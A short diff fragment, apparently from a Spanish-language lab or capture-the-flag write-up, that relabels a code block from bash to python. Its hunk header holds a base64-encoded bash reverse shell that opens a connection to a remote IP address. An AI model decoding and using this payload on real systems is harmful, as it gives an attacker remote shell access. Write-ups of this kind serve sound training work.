@@ -36,7 +36,7 @@ L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMjQyLjIxNy80NDMgMD4mMScK
 
 Se modifica el payload y la url:
 
-```bash
+```python
 #!/usr/bin/python3
 
 import signal, time, os
